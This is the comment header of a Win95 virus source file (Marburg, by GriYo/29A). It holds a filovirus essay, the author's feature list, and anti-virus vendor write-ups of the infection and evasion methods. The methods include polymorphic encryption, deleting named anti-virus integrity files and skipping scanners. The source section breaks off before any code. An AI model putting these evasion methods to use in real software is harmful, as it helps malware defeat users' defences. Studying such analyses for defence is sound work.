<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.Marburg.b - marburg.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Marburg virus - BioCoded by GriYo / 29A</span><span class="sc0">
</span><span class="sc1">;   ---------------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;   Index:</span><span class="sc0">
</span><span class="sc1">;   ------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   1 - About the biological version</span><span class="sc0">
</span><span class="sc1">;   2 - Author's description</span><span class="sc0">
</span><span class="sc1">;   3 - Description from Datafellows</span><span class="sc0">
</span><span class="sc1">;   4 - Description from AVP</span><span class="sc0">
</span><span class="sc1">;   5 - Description from DrSolomon</span><span class="sc0">
</span><span class="sc1">;   6 - Marburg source code</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   1 - About the biological version</span><span class="sc0">
</span><span class="sc1">;   --------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   1967: Marburg/Frankfurt, Germany.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Laboratory  workers preparing  primary  cell cultures  from  African</span><span class="sc0">
</span><span class="sc1">; green monkeys resulted in  an outbreak of a previously unrecognised disease.</span><span class="sc0">
</span><span class="sc1">; Highly  infectious: 31 cases, 7 deaths.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   1976: </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Outbreak of  a previously unrecognised  haemorrhagic  fever in Zaire </span><span class="sc0">
</span><span class="sc1">; and Sudan 'Ebola disease': 500 diagnosed cases,  460 deaths.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Ebola  virus, a member of the Filoviridae, burst from obscurity with</span><span class="sc0">
</span><span class="sc1">; spectacular   outbreaks  of  severe,  haemorrhagic  fever.  It   was   first</span><span class="sc0">
</span><span class="sc1">; associated  with an outbreak of  318 cases and a case-fatality  rate of  90%</span><span class="sc0">
</span><span class="sc1">; in Zaire and caused  150 deaths among  250 cases in Sudan. Smaller outbreaks</span><span class="sc0">
</span><span class="sc1">; continue to  appear periodically, particularly in East, Central and southern</span><span class="sc0">
</span><span class="sc1">; Africa. In 1989, a haemorrhagic  disease  was  recognized  among  cynomolgus </span><span class="sc0">
</span><span class="sc1">; macaques  imported into the United States from  the  Philippines. Strains of</span><span class="sc0">
</span><span class="sc1">; Ebola virus  were isolated from  these  monkeys. Serologic  studies  in  the</span><span class="sc0">
</span><span class="sc1">; Philippines and elsewhere in Southeast Asia indicated that  Ebola virus is a </span><span class="sc0">
</span><span class="sc1">; prevalent cause of infection among macaques.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; These  threadlike   polymorphic  viruses  are  highly   variable  in  length </span><span class="sc0">
</span><span class="sc1">; apparently  owing  to  concatemerization. However,  the average length of an </span><span class="sc0">
</span><span class="sc1">; infectious  virion appears to be  920 nm.  The virions are 80 nm in diameter </span><span class="sc0">
</span><span class="sc1">; with  a  helical nucleocapsid,  a membrane made of  10 nm  projections,  and </span><span class="sc0">
</span><span class="sc1">; host cell membrane.  They  contain  a  unique  single-stranded  molecule  of </span><span class="sc0">
</span><span class="sc1">; noninfectious   (negative sense)   RNA.   The   virus   is   composed  of  7 </span><span class="sc0">
</span><span class="sc1">; polypeptides,  a   nucleoprotein,  a glycoprotein,  a polymerase and 4 other </span><span class="sc0">
</span><span class="sc1">; undesignated  proteins.   Proteins   are   produced   from    polyadenylated  </span><span class="sc0">
</span><span class="sc1">; monocistronic  mRNA  species transcribed from virus RNA.  The replication in </span><span class="sc0">
</span><span class="sc1">; and  destruction  of  the  host cell is rapid and produces a large number of </span><span class="sc0">
</span><span class="sc1">; viruses  budding from the cell membrane.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Epidemics  have resulted  from  person  to  person  transmission, nosocomial </span><span class="sc0">
</span><span class="sc1">; spread  or  laboratory  infections. The mode  of primary infection  and  the</span><span class="sc0">
</span><span class="sc1">; natural  ecology  of these viruses are unknown.  Association  with bats  has </span><span class="sc0">
</span><span class="sc1">; been implicated  directly in at least 2 episodes  when  individuals  entered</span><span class="sc0">
</span><span class="sc1">; the  same  bat-filled  cave in  Eastern Kenya.  Ebola infections in Sudan in  </span><span class="sc0">
</span><span class="sc1">; 1976 and 1979  occurred in workers  of a cotton factory containing thousands</span><span class="sc0">
</span><span class="sc1">; of bats in the roof.  However, in all instances, study  of antibody in  bats</span><span class="sc0">
</span><span class="sc1">; failed to detect evidence  of infection,  and no virus was isolated from bat</span><span class="sc0">
</span><span class="sc1">; tissue.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  index  case  in  1976  was  never  identified, but  this large outbreak</span><span class="sc0">
</span><span class="sc1">; resulted in  280 deaths  of  318 infections.  The outbreak was primarily the </span><span class="sc0">
</span><span class="sc1">; result  of person to person spread and transmission by contaminated  needles </span><span class="sc0">
</span><span class="sc1">; in  outpatient  and  inpatient  departments  of  a hospital  and  subsequent </span><span class="sc0">
</span><span class="sc1">; person to person  spread in  surrounding villages. In  serosurveys in Zaire,</span><span class="sc0">
</span><span class="sc1">; antibody prevalence to  Ebola virus has been 3 to 7%.  The incubation period </span><span class="sc0">
</span><span class="sc1">; for  needle-transmitted Ebola virus  is  5 to 7  days and that for person to </span><span class="sc0">
</span><span class="sc1">; person transmitted disease is 6 to 12 days.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  virus  spreads  through  the  blood and  is  replicated in many organs.</span><span class="sc0">
</span><span class="sc1">; The  histopathologic  change  is  focal necrosis  in these organs, including </span><span class="sc0">
</span><span class="sc1">; the liver,  lymphatic organs,  kidneys,  ovaries  and  testes.  The  central  </span><span class="sc0">
</span><span class="sc1">; lesions   appear  to   be   those   affecting the vascular   endothelium and</span><span class="sc0">
</span><span class="sc1">; the   platelets. The   resulting manifestations  are bleeding, especially in</span><span class="sc0">
</span><span class="sc1">; the mucosa, abdomen, pericardium and vagina.  Capillary leakage  appears  to</span><span class="sc0">
</span><span class="sc1">; lead  to  loss  of  intravascular  volume,  bleeding,  shock  and  the acute </span><span class="sc0">
</span><span class="sc1">; respiratory disorder seen in fatal cases. Patients die of intractable shock.</span><span class="sc0">
</span><span class="sc1">; Those  with  severe  illness  often  have  sustained  high  fevers  and  are</span><span class="sc0">
</span><span class="sc1">; delirious, combative and difficult to control.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  serologic  method  used  in  the  discovery  of  Ebola  was  the direct </span><span class="sc0">
</span><span class="sc1">; immunofluorescent  assay. The test is  performed on a  monolayer of infected</span><span class="sc0">
</span><span class="sc1">; and  uninfected  cells fixed on a microscopic slide.  IgG-  or  IgM-specific </span><span class="sc0">
</span><span class="sc1">; immunoglobulin assays are performed.  These tests   may  then  be  confirmed</span><span class="sc0">
</span><span class="sc1">; by using western blot or radioimmunoprecipitation.  Virus  isolation is also </span><span class="sc0">
</span><span class="sc1">; a highly useful diagnostic  method, and is performed  on suitably  preserved</span><span class="sc0">
</span><span class="sc1">; serum, blood or tissue specimens stored at -70oC or freshly collected.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; No specific antiviral therapy presently exists against Ebola virus, nor does</span><span class="sc0">
</span><span class="sc1">; interferon  have  any  effect.  Past  recommendations  for  isolation of the </span><span class="sc0">
</span><span class="sc1">; patient  in  a  plastic  isolator  have  given  way  to  the  more  moderate </span><span class="sc0">
</span><span class="sc1">; recommendation  of  strict  barrier  isolation with body fluid  precautions. </span><span class="sc0">
</span><span class="sc1">; This  presents  no  excess  risk  to  the   hospital  personnel  and  allows </span><span class="sc0">
</span><span class="sc1">; substantially better patient care, as shown in Table 2.  The major factor in </span><span class="sc0">
</span><span class="sc1">; nosocomial  transmission  is  the  combination  of  the  unawareness  of the </span><span class="sc0">
</span><span class="sc1">; possibility  of  the  disease  by  a  worker who is also  inattentive to the </span><span class="sc0">
</span><span class="sc1">; requirements  of  effective  barrier  nursing.  after diagnosis, the risk of </span><span class="sc0">
</span><span class="sc1">; nosocomial transmission is small.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The basic method of prevention and control is the  interruption of person to</span><span class="sc0">
</span><span class="sc1">; person spread of the virus. However,  in rural areas,  this may be difficult </span><span class="sc0">
</span><span class="sc1">; because  families  are  often reluctant  to admit members  to  the  hospital  </span><span class="sc0">
</span><span class="sc1">; because  of  limited  resources  and the  culturally unacceptable separation </span><span class="sc0">
</span><span class="sc1">; of  sick  or  dying  patients from the  care  of  their  family.  Experience  </span><span class="sc0">
</span><span class="sc1">; with human disease and primate infection suggests that  a vaccine inducing a</span><span class="sc0">
</span><span class="sc1">; strong cell-mediated  response  will  be  necessary for  virus clearance and </span><span class="sc0">
</span><span class="sc1">; adequate   protection.   Neutralizing   antibodies   are   not  observed  in </span><span class="sc0">
</span><span class="sc1">; convalescent  patients  nor do they occur in primates inoculated with killed </span><span class="sc0">
</span><span class="sc1">; vaccine.   A  vaccine  expressing  the  glycoprotein  in  vaccinia  is being </span><span class="sc0">
</span><span class="sc1">; prepared for laboratory evaluation.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                     Emerging &amp; Re-emerging Viruses: An Essay</span><span class="sc0">
</span><span class="sc1">;                                                              Alison Jacobson</span><span class="sc0">
</span><span class="sc1">;                                                   Department of Microbiology</span><span class="sc0">
</span><span class="sc1">;                                                      University of Cape Town</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2 - Author's description</span><span class="sc0">
</span><span class="sc1">;   ------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Marburg  is  a  direct action  Win32 executable files infector. Lets </span><span class="sc0">
</span><span class="sc1">; look at its features in more detail...</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2.1. Infection</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   When an infected file is run the virus will look for *.EXE and *.SCR</span><span class="sc0">
</span><span class="sc1">; files  in  current  directory,   as  well  as  WINDOWS  and  WINDOWS  system </span><span class="sc0">
</span><span class="sc1">; directories.  Marburg use size padding to mark infected files.  Depending on </span><span class="sc0">
</span><span class="sc1">; the  internal  format of each file the virus sometimes  infects them without </span><span class="sc0">
</span><span class="sc1">; modifying the entry-point  field in  the file header.  In some files Marburg </span><span class="sc0">
</span><span class="sc1">; overwrites  the  code  at  its host entry-point with  a block or polymorphic </span><span class="sc0">
</span><span class="sc1">; code.  This code is used to  hide the  branch to viral code. Marburg infects </span><span class="sc0">
</span><span class="sc1">; files  by  mapping  them  in  memory.  This allows the virus to speed up its </span><span class="sc0">
</span><span class="sc1">; infection procedures. </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2.2. Polymorphism</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The  virus  is   encrypted   under  a  polymorphic  decryptor.   The </span><span class="sc0">
</span><span class="sc1">; polymorphic  engine  uses  slow mutation  technics  and can generate lots of </span><span class="sc0">
</span><span class="sc1">; different looking code.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2.3. Retro</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Some intergrity checksum files deleted on infection.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2.4. Error-handling</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The  virus startup and infection routines uses estructured exception</span><span class="sc0">
</span><span class="sc1">; handling to prevent  the virus from causing FAULTS  at any time.  This makes </span><span class="sc0">
</span><span class="sc1">; Marburg a very stable virus.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   2.5. Payload</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   A nice graphic payload inside... I think this is a must for viruses</span><span class="sc0">
</span><span class="sc1">; that works under GUI.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   3 - Description from Datafellows</span><span class="sc0">
</span><span class="sc1">;   --------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   NAME: Marburg</span><span class="sc0">
</span><span class="sc1">;   TYPE: Non-resident EXE -files</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The  Win95/Marburg  virus got widespread circulation in August 1998, </span><span class="sc0">
</span><span class="sc1">; when it was included on the master CD of the popular  MGM/EA PC CD-ROM  game </span><span class="sc0">
</span><span class="sc1">; "Wargames". The CD contains one file infected by the Marburg virus:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   \EREG\EREG32.EXE</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   MGM -  the publisher of the game  - made  an announcment  on this on </span><span class="sc0">
</span><span class="sc1">; 12th of August, 1998:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   --------</span><span class="sc0">
</span><span class="sc1">;   From: "K.Egan (MGM)" kegan@mgm.com </span><span class="sc0">
</span><span class="sc1">;   Subject: MGM WarGames Statement </span><span class="sc0">
</span><span class="sc1">;   Date: Wed, 12 Aug 1998 18:03:39 -0700 </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   MGM Interactive  recently learned that its  WarGames PC game shipped </span><span class="sc0">
</span><span class="sc1">;   with  the   Win32/Marburg.a   virus  contained  in  the   electronic </span><span class="sc0">
</span><span class="sc1">;   registration  program.  The company is working  as fast as it can to </span><span class="sc0">
</span><span class="sc1">;   resolve the problem.</span><span class="sc0">
</span><span class="sc1">;   ...</span><span class="sc0">
</span><span class="sc1">;   MGM Interactive  is committed  to delivering top quality products to </span><span class="sc0">
</span><span class="sc1">;   consumers.  This is an  unfortunate  circumstance  and  we sincerely </span><span class="sc0">
</span><span class="sc1">;   apologize for any convenience this has caused you.</span><span class="sc0">
</span><span class="sc1">;   ...</span><span class="sc0">
</span><span class="sc1">;   If  you  have  any  questions  or  if  you  would  like to receive a </span><span class="sc0">
</span><span class="sc1">;   replacement disc, please contact MGM Interactive.  </span><span class="sc0">
</span><span class="sc1">;   --------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The same  virus also got widespread circulation in August 1998,  when it was</span><span class="sc0">
</span><span class="sc1">; included on the cover CD of the Australian "PC Power Play" magazine. This CD</span><span class="sc0">
</span><span class="sc1">; contains these files infected by the Marburg virus:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   \GAMES\MAX2\MAX2BETA.EXE</span><span class="sc0">
</span><span class="sc1">;   \GAMES\STARTREK\FURYDEMO.EXE</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; In July 1998,  the Win95/Marburg  virus got yet again widespread circulation</span><span class="sc0">
</span><span class="sc1">; when it  was  included  by accident on the cover CD of the UK-based PC Gamer</span><span class="sc0">
</span><span class="sc1">; Magazine's  July  1998 edition.  The  infected  files  are  on  "CD Gamer 2"</span><span class="sc0">
</span><span class="sc1">; included with the magazine, and are called:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   \UTILS\XEARTH\XEARTH.EXE</span><span class="sc0">
</span><span class="sc1">;   \UTILS\QPAINT\QPAINT.EXE</span><span class="sc0">
</span><span class="sc1">;   \VIDEO\SMACKPLW.EXE</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  SMACKPLW  program  is  automatically  executed if  you watch any of the</span><span class="sc0">
</span><span class="sc1">; preview  videos  from  the  CD. There are localized versions of the PC Gamer</span><span class="sc0">
</span><span class="sc1">; magazine in circulation in addition to the UK edition.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  Swedish  edition  has  these  files infected instead of the ones listed</span><span class="sc0">
</span><span class="sc1">; above:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   \SHARE\3DJONG\M3DJONGG.EXE</span><span class="sc0">
</span><span class="sc1">;   \PATCHAR\QUAKE2\Q2-315~8.EXE</span><span class="sc0">
</span><span class="sc1">;   \SPEL\KKND2\DIRECTX\DDHELP.EXE</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  Slovenian  edition has  the same infected files as the UK edition.  The</span><span class="sc0">
</span><span class="sc1">; Italian July/August edition is clean.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Marburg is a polymorphic Windows 95/98 virus which contains this text:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   [ Marburg ViRuS BioCoded by GriYo/29A ]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Marburg infects  Win32 EXE and SCR (screen saver) files,  encrypting its own</span><span class="sc0">
</span><span class="sc1">; code  with variable polymorphic encryption layer.  The polymorphic engine of</span><span class="sc0">
</span><span class="sc1">; the virus is advanced.  It encrypts the virus with 8, 16 and 32 bit key with</span><span class="sc0">
</span><span class="sc1">; several  different methods.  The virus uses slow polymorphisism, which means</span><span class="sc0">
</span><span class="sc1">; that it changes the decryptor of itself very slowly.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Marburg deletes integrity databases of several anti-virus products.  It also</span><span class="sc0">
</span><span class="sc1">; avoids infecting many known  anti-virus  product executable files, including</span><span class="sc0">
</span><span class="sc1">; any executable  which has the letter "V" in its name.  This is done to avoid</span><span class="sc0">
</span><span class="sc1">; triggering the self-check of these programs.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Marburg  activates  three months  after  initial  infection.  If an infected</span><span class="sc0">
</span><span class="sc1">; application is executed exactly on  the same hour as the  inital  infection,</span><span class="sc0">
</span><span class="sc1">; the  virus displays  the standard  Windows  error  icon  (red cross in white</span><span class="sc0">
</span><span class="sc1">; circle) in random positions all over the screen.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   4 - Description from AVP</span><span class="sc0">
</span><span class="sc1">;   ------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   This is a direct action  (nonmemory resident)  Windows95 polymorphic</span><span class="sc0">
</span><span class="sc1">; virus. It affects  PE EXE  (Portable Executable)  files which it searches in</span><span class="sc0">
</span><span class="sc1">; current, Windows and  System  directories.  Because of bugs the virus is not</span><span class="sc0">
</span><span class="sc1">; able to replicate under Windows NT, so it is Windows95 specific virus.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; When an infected file is executed, the virus searches for KERNEL32 routines:</span><span class="sc0">
</span><span class="sc1">; first for GetModuleHandleA and GetProcAddress,  then  for  22 more functions</span><span class="sc0">
</span><span class="sc1">; (see the list below).  While  searching  the  virus  uses method  similar to</span><span class="sc0">
</span><span class="sc1">; "Win32.Cabanas" virus:  while  infecting  a  file  the  virus  scans  file's</span><span class="sc0">
</span><span class="sc1">; imported  table  for  GetModuleHandleA  and  GetProcAddress, and saves these</span><span class="sc0">
</span><span class="sc1">; addresses in virus code.  If there are no  these entries in table, the virus</span><span class="sc0">
</span><span class="sc1">; scans KERNEL32 code.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; If  the virus  is not  able to  locate  KERNEL32  functions,  it immediately</span><span class="sc0">
</span><span class="sc1">; returns to the host file.  Otherwise it allocates a block of system  memory,</span><span class="sc0">
</span><span class="sc1">; copies its code to there (that's necessary to run virus polymorphic engine),</span><span class="sc0">
</span><span class="sc1">; then searches for files and infects them.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; While infecting a file the virus writes its code to the end of file into the</span><span class="sc0">
</span><span class="sc1">; last section, increasing its length beforehand.  Before saving  its  code to</span><span class="sc0">
</span><span class="sc1">; the  file the virus  encrypts it  by  polymorphic  routine  (the polymorphic</span><span class="sc0">
</span><span class="sc1">; engine  is  very similar  with one that  was found  in  "Win95.HPS"  virus).</span><span class="sc0">
</span><span class="sc1">; Depending  on  file structure the virus also does some tricks  to make virus</span><span class="sc0">
</span><span class="sc1">; detection  and disinfection procedures  more complex:  either replaces entry</span><span class="sc0">
</span><span class="sc1">; point  address in the PE header with its own one  (majority of Win32 viruses</span><span class="sc0">
</span><span class="sc1">; infect files in this way), or saves  JMP_Virus instruction to the file entry</span><span class="sc0">
</span><span class="sc1">; address  and  does  not modifies  it  in  the  PE  header  (in  same  way as</span><span class="sc0">
</span><span class="sc1">; "Win32.Cabanas"  virus does),  or  writes  to the entry point  a polymorphic</span><span class="sc0">
</span><span class="sc1">; junk routine that is followed by JMP_Virus instruction.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Before infecting  the  virus  deletes  anti-virus  data files: ANTI-VIR.DAT,</span><span class="sc0">
</span><span class="sc1">; CHKLIST.MS, AVP.CRC, IVB.NTZ.  While infecting  the virus checks  file names</span><span class="sc0">
</span><span class="sc1">; and  does  not  infect  files  that  have  'V'  letter  in  name  as well as</span><span class="sc0">
</span><span class="sc1">; anti-viruses PANDA, F-PROT, SCAN.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Depending on the system date  (when infected file is executed in three month</span><span class="sc0">
</span><span class="sc1">; during  the  same hour  as being infected)  the  virus  displays  at  random</span><span class="sc0">
</span><span class="sc1">; selected positions on the screen the standard Windows error icon - red cross</span><span class="sc0">
</span><span class="sc1">; in white circle.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  virus contains  the text strings  (the first block contains the list of</span><span class="sc0">
</span><span class="sc1">; functions that virus is looking for):</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   GetModuleHandleA </span><span class="sc0">
</span><span class="sc1">;   GetProcAddress </span><span class="sc0">
</span><span class="sc1">;   CreateFileA </span><span class="sc0">
</span><span class="sc1">;   CreateFileMappingA </span><span class="sc0">
</span><span class="sc1">;   MapViewOfFile </span><span class="sc0">
</span><span class="sc1">;   UnmapViewOfFile </span><span class="sc0">
</span><span class="sc1">;   CloseHandle </span><span class="sc0">
</span><span class="sc1">;   FindFirstFileA </span><span class="sc0">
</span><span class="sc1">;   FindNextFileA </span><span class="sc0">
</span><span class="sc1">;   FindClose </span><span class="sc0">
</span><span class="sc1">;   VirtualAlloc </span><span class="sc0">
</span><span class="sc1">;   GetWindowsDirectoryA </span><span class="sc0">
</span><span class="sc1">;   GetSystemDirectoryA </span><span class="sc0">
</span><span class="sc1">;   GetCurrentDirectoryA </span><span class="sc0">
</span><span class="sc1">;   SetFileAttributesA </span><span class="sc0">
</span><span class="sc1">;   SetFileTime </span><span class="sc0">
</span><span class="sc1">;   DeleteFileA </span><span class="sc0">
</span><span class="sc1">;   GetCurrentProcess </span><span class="sc0">
</span><span class="sc1">;   WriteProcessMemory </span><span class="sc0">
</span><span class="sc1">;   LoadLibraryA </span><span class="sc0">
</span><span class="sc1">;   GetSystemTime </span><span class="sc0">
</span><span class="sc1">;   GetDC </span><span class="sc0">
</span><span class="sc1">;   LoadIconA </span><span class="sc0">
</span><span class="sc1">;   DrawIcon</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   [ Marburg ViRuS BioCoded by GriYo/29A ]</span><span class="sc0">
</span><span class="sc1">;   KERNEL32.dll USER32.dll</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   5 - Description from DrSolomon</span><span class="sc0">
</span><span class="sc1">;   ------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Win32/Marburg</span><span class="sc0">
</span><span class="sc1">;   Polymorphic virus</span><span class="sc0">
</span><span class="sc1">;   Infects: Windows-95 executable files </span><span class="sc0">
</span><span class="sc1">;            (PE files - "Portable Executable")</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   This  highly polymorphic virus infects  Windows-95  executable files</span><span class="sc0">
</span><span class="sc1">; (PE files - "Portable Executable").   When  the  infected  file  is  run  it</span><span class="sc0">
</span><span class="sc1">; searches  for  executable  files  to infect  in the  current  directory, the</span><span class="sc0">
</span><span class="sc1">; Windows  directory  and   the  System directory.   The  virus  does  not  go</span><span class="sc0">
</span><span class="sc1">; memory-resident - instead it is a direct action virus.  The  infected  files</span><span class="sc0">
</span><span class="sc1">; always grow in size.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The sizes of infected files are changed by the the virus  to be divisible by</span><span class="sc0">
</span><span class="sc1">; 101 (decimal). It does this to avoid infecting the same file twice.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; If  the  virus  comes  across  integrity-checking  databases  (ANTI-VIR.DAT,</span><span class="sc0">
</span><span class="sc1">; CHKLIST.MS, AVP.CRC, IVB.NTZ)  in  the  above  mentioned  subdirectories  it</span><span class="sc0">
</span><span class="sc1">; deletes them.  This is an attempt  to avoid  detection by certain anti-virus</span><span class="sc0">
</span><span class="sc1">; products.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  virus  does  not  infect  any  files  having  letter  "V"  in the name,</span><span class="sc0">
</span><span class="sc1">; "PAND*.*" , "F-PR*.*" , "SCAN*.*"  (this  is  to  avoid  infecting   certain</span><span class="sc0">
</span><span class="sc1">; anti-virus programs).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The  payload  of the virus  triggers at  a random date and displays an error</span><span class="sc0">
</span><span class="sc1">; icon (a red cross on white circle) on the screen.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Marburg has been seen in the wild, and was accidentally  distributed  on the</span><span class="sc0">
</span><span class="sc1">; cover CD ROM of UK magazine PC Gamer in July 1998.  The virus was written by</span><span class="sc0">
</span><span class="sc1">; Griyo of the Spanish virus-writing gang 29A.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   6 - Marburg source code</span><span class="sc0">
</span><span class="sc1">;   -----------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   After some time lost into   Win32  internals  im happy to present my</span><span class="sc0">
</span><span class="sc1">; first attempt at this plattaform. This is a Win95 highly polymorphic direct-</span><span class="sc0">
</span><span class="sc1">; action PE infector.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Greetings to all the people at IRC-Hispano  #virus  and  #hack irc channels.</span><span class="sc0">
</span><span class="sc1">; Special  greetings  goes  this  time to  Jacky Qwerty, this virus wouldnt be</span><span class="sc0">
</span><span class="sc1">; posible without his support.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; --------&gt;8 cut here ---------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
